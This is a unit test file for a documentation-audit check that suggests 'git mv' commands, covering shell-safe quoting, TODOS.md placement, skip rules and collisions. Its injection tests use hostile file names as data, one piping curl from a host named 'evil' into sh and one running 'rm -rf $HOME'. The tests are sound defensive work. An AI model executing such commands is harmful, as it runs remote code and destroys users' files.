/**
 * checks-doc-type.test.ts — unit tests for src/audit/checks/doc-type.ts.
 *
 * Closes the high-value coverage gaps surfaced in /ship's coverage audit
 * + the codex ship review's CRITICAL shell-injection finding. Tests:
 *
 *   - Shell injection defense: paths with `;`, `$()`, backticks, spaces,
 *     leading dashes, embedded single quotes — all single-quoted in the
 *     emitted `Suggested: git mv ...` line.
 *   - inboxDestination resolution: root TODOS.md vs docs/TODOS.md vs
 *     neither (defaults to docs/TODOS.md, never creates a shadow root).
 *   - Skip rules: allowlist (CONTRIBUTING.md, *checklist*.md), root docs
 *     (README.md), project docs (TODOS.md), in-docs/designs/ (mermaid
 *     fence INSIDE the canonical location), tiny stubs (<5 content lines).
 *   - Plantuml fence (paired with mermaid in the regex; previously only
 *     mermaid had a fixture).
 *   - Collision: destination already exists → "review and move"
 *     suggestion, no destructive git mv emitted.
 *
 * Constructs a minimal AuditCtx shape directly — runCheckDocType only
 * reads ctx.mdFiles, ctx.repoRoot, ctx.exists.{rootTodos,docsTodos}, so
 * we don't need the full buildAuditCtx machinery for these unit tests.
 */

import { afterAll, describe, expect, test } from 'bun:test';
import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';

import { runCheckDocType } from '../src/audit/checks/doc-type.ts';
import type { AuditCtx, AuditFileExists, MdFileSnapshot } from '../src/audit/types.ts';
import { makeBaseTmp } from './helpers/fixture-repo.ts';

const baseTmp = makeBaseTmp('check-doc-type-');
afterAll(() => {
  try { rmSync(baseTmp, { recursive: true, force: true }); } catch {}
});

// Construct a minimal AuditCtx for runCheckDocType. Only the fields the
// check actually reads are populated; everything else is left empty/null.
function makeCtx(opts: {
  repoRoot: string;
  mdFiles: MdFileSnapshot[];
  rootTodos?: boolean;
  docsTodos?: boolean;
}): AuditCtx {
  const exists = {
    rootTodos: opts.rootTodos ?? false,
    docsTodos: opts.docsTodos ?? false,
  } as unknown as AuditFileExists;
  return { repoRoot: opts.repoRoot, mdFiles: opts.mdFiles, exists } as unknown as AuditCtx;
}

function makeFile(rel: string, content: string): MdFileSnapshot {
  return { abs: join('/fake', rel), rel, content };
}

const CHECKBOX_HEAVY_CONTENT = [
  '- [ ] Item one',
  '- [ ] Item two',
  '- [ ] Item three',
  '- [ ] Item four',
  '- [ ] Item five',
  '- [ ] Item six',
].join('\n');

const MERMAID_CONTENT = [
  'Some intro text.',
  'A second line so we have content.',
  '',
  '```mermaid',
  'graph TD',
  '  A --> B',
  '  B --> C',
  '```',
  '',
  'Footer line.',
].join('\n');

const PLANTUML_CONTENT = [
  'Some intro text.',
  'A second line.',
  '',
  '```plantuml',
  '@startuml',
  'A -> B',
  '@enduml',
  '```',
  '',
  'Footer.',
].join('\n');

// ─── Shell injection defense ─────────────────────────────────────────

describe('runCheckDocType: shell-safe suggestion quoting', () => {
  test('paths with semicolons are single-quoted', () => {
    const repoRoot = join(baseTmp, `shell-semi-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const evilName = 'docs/a;curl evil|sh.md';
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile(evilName, MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    // The suggestion must single-quote the malicious path so it cannot
    // execute when copy-pasted.
    expect(body).toContain(`'${evilName}'`);
    // And the destination uses `git mv -- ` (end-of-options sentinel)
    // so a leading-dash filename is never interpreted as a flag.
    expect(body).toContain('git mv -- ');
    // Critically: the unquoted form must NOT appear.
    expect(body).not.toContain('git mv ' + evilName);
  });

  test('paths with $(), backticks, and dollar signs are quoted', () => {
    const repoRoot = join(baseTmp, `shell-meta-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const evilName = 'docs/$(rm -rf $HOME).md';
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile(evilName, MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    // Inside single quotes, $() and backticks are literal — safe.
    expect(body).toContain(`'${evilName}'`);
  });

  test('paths with embedded single quotes are escaped via close-escape-reopen', () => {
    const repoRoot = join(baseTmp, `shell-quote-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const evilName = "docs/it's-tricky.md";
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile(evilName, MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    // The classic POSIX trick: 'foo'\''bar' (close, escaped quote, reopen).
    expect(body).toContain(String.raw`'docs/it'\''s-tricky.md'`);
  });

  test('paths with spaces are safely quoted (no shell-word-splitting)', () => {
    const repoRoot = join(baseTmp, `shell-space-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const spacedName = 'docs/with spaces.md';
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile(spacedName, MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    expect(body).toContain(`'${spacedName}'`);
  });
});

// ─── inboxDestination resolution (TODOS.md root vs docs/) ────────────

describe('runCheckDocType: inbox destination respects existing TODOS.md location', () => {
  test('docs/TODOS.md exists → suggest moving to docs/TODOS.md', () => {
    const repoRoot = join(baseTmp, `inbox-docs-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs'), { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/random-inbox.md', CHECKBOX_HEAVY_CONTENT)],
      docsTodos: true,
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    // Either the suggestion targets docs/TODOS.md, OR (if the dest exists
    // on disk via the mkdirSync above plus a real file) the collision
    // branch fires. Both confirm the canonical-location resolution.
    // We did NOT create the actual file, so the suggestion path runs.
    expect(body).toContain("'docs/TODOS.md'");
    // It MUST NOT suggest creating a shadow root TODOS.md.
    expect(body).not.toContain("git mv -- 'docs/random-inbox.md' 'TODOS.md'");
  });

  test('only root TODOS.md exists → suggest root TODOS.md', () => {
    const repoRoot = join(baseTmp, `inbox-root-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('inbox.md', CHECKBOX_HEAVY_CONTENT)],
      rootTodos: true,
      docsTodos: false,
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    expect(body).toContain("'TODOS.md'");
  });

  test('neither exists → defaults to docs/TODOS.md (canonical)', () => {
    const repoRoot = join(baseTmp, `inbox-neither-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('inbox.md', CHECKBOX_HEAVY_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    const body = result.body.join('\n');
    expect(body).toContain("'docs/TODOS.md'");
  });
});

// ─── Skip rules (don't flag legitimate cases) ─────────────────────────

describe('runCheckDocType: skip rules', () => {
  test('CONTRIBUTING.md with checkbox-heavy content is NOT flagged (allowlist)', () => {
    const repoRoot = join(baseTmp, `skip-contrib-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('CONTRIBUTING.md', CHECKBOX_HEAVY_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('release-checklist.md (matches *checklist* pattern) is NOT flagged', () => {
    const repoRoot = join(baseTmp, `skip-checklist-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/release-checklist.md', CHECKBOX_HEAVY_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('README.md with mermaid fence is NOT flagged (ROOT_DOCS)', () => {
    const repoRoot = join(baseTmp, `skip-readme-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('README.md', MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('TODOS.md with checkbox-heavy content is NOT flagged (PROJECT_DOCS)', () => {
    const repoRoot = join(baseTmp, `skip-todos-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('TODOS.md', CHECKBOX_HEAVY_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('mermaid fence INSIDE docs/designs/ is NOT flagged (already canonical)', () => {
    const repoRoot = join(baseTmp, `skip-designs-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/designs/system-flow.md', MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });

  test('file with fewer than 5 content lines is skipped (tiny stub)', () => {
    const repoRoot = join(baseTmp, `skip-stub-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    // 3 content lines, all checkbox — would be 100% density, but skip
    // because contentLines < MIN_CONTENT_LINES (5).
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [
        makeFile('tiny.md', '- [ ] one\n- [ ] two\n- [ ] three\n'),
      ],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('pass');
  });
});

// ─── Plantuml fence (paired with mermaid in the regex) ───────────────

describe('runCheckDocType: plantuml fence triggers design-mismatch', () => {
  test('plantuml fence outside docs/designs/ is flagged like mermaid', () => {
    const repoRoot = join(baseTmp, `plantuml-${Date.now()}`);
    mkdirSync(repoRoot, { recursive: true });
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/sequence.md', PLANTUML_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    expect(body).toContain('looks like a design doc (mermaid/plantuml fence)');
    expect(body).toContain("'docs/designs/sequence.md'");
  });
});

// ─── Collision branch (destination exists) ──────────────────────────

describe('runCheckDocType: collision branch suppresses git mv', () => {
  test('design destination already exists → "review and move" emitted', () => {
    const repoRoot = join(baseTmp, `collision-design-${Date.now()}`);
    mkdirSync(join(repoRoot, 'docs', 'designs'), { recursive: true });
    // Pre-create the destination file so suggestionFor's existsSync hits.
    writeFileSync(
      join(repoRoot, 'docs', 'designs', 'arch.md'),
      '# Existing design doc\n',
    );
    const ctx = makeCtx({
      repoRoot,
      mdFiles: [makeFile('docs/arch.md', MERMAID_CONTENT)],
    });
    const result = runCheckDocType(ctx);
    expect(result.status).toBe('warn');
    const body = result.body.join('\n');
    expect(body).toContain('review and move');
    expect(body).toContain('destination ambiguous');
    // No destructive git mv emitted.
    expect(body).not.toContain('git mv -- ');
  });
});
